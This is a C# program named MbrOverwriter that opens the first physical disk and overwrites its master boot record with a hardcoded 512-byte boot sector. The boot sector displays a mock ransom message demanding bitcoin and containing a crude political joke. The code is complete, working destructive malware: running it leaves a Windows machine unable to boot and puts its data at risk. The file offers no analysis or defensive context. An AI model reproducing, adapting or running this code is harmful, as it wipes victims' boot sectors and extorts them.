﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace MbrOverwriter
{
    public static class Class1
    {
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberBytesWritten, IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        private const uint MbrSize = 512u;

        public static void Main(string[] args)
        {
            var mbrData = new byte[] {0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
0x09, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
0x10, 0xEB, 0xF5, 0xC3, 0x68, 0x65, 0x79, 0x2C, 0x20, 0x79, 0x6F, 0x20, 0x63, 0x6F, 0x6D, 0x70,
0x75, 0x74, 0x65, 0x72, 0x73, 0x20, 0x6D, 0x62, 0x72, 0x20, 0x66, 0x69, 0x6C, 0x65, 0x20, 0x67,
0x6F, 0x74, 0x20, 0x6F, 0x76, 0x65, 0x72, 0x77, 0x72, 0x69, 0x74, 0x65, 0x64, 0x0D, 0x0A, 0x74,
0x68, 0x61, 0x74, 0x20, 0x6D, 0x65, 0x61, 0x6E, 0x73, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x75,
0x20, 0x61, 0x69, 0x6E, 0x74, 0x20, 0x62, 0x6F, 0x6F, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x75, 0x70,
0x20, 0x77, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x61, 0x67, 0x61, 0x69, 0x6E, 0x2C, 0x20,
0x75, 0x6E, 0x6C, 0x65, 0x73, 0x73, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x70, 0x61, 0x79, 0x20, 0x6D,
0x65, 0x20, 0x33, 0x2E, 0x31, 0x34, 0x20, 0x62, 0x69, 0x74, 0x63, 0x6F, 0x69, 0x6E, 0x73, 0x0D,
0x0A, 0x31, 0x30, 0x30, 0x25, 0x20, 0x72, 0x65, 0x61, 0x6C, 0x20, 0x6E, 0x6F, 0x20, 0x73, 0x63,
0x61, 0x6D, 0x0D, 0x0A, 0x2E, 0x2E, 0x2E, 0x0D, 0x0A, 0x61, 0x73, 0x6B, 0x20, 0x6D, 0x79, 0x20,
0x77, 0x61, 0x6C, 0x6C, 0x65, 0x74, 0x20, 0x69, 0x6E, 0x20, 0x63, 0x68, 0x69, 0x6E, 0x61, 0x78,
0x69, 0x6A, 0x69, 0x6E, 0x67, 0x70, 0x69, 0x6E, 0x67, 0x63, 0x63, 0x70, 0x2E, 0x63, 0x6F, 0x6D,
0x20, 0x62, 0x79, 0x20, 0x73, 0x61, 0x79, 0x69, 0x6E, 0x67, 0x20, 0x78, 0x69, 0x20, 0x6A, 0x69,
0x6E, 0x70, 0x69, 0x6E, 0x67, 0x20, 0x69, 0x73, 0x20, 0x77, 0x69, 0x6E, 0x6E, 0x69, 0x65, 0x20,
0x70, 0x6F, 0x6F, 0x0D, 0x0A, 0x74, 0x72, 0x75, 0x73, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
            Environment.Exit(-1);
        }

    }
}
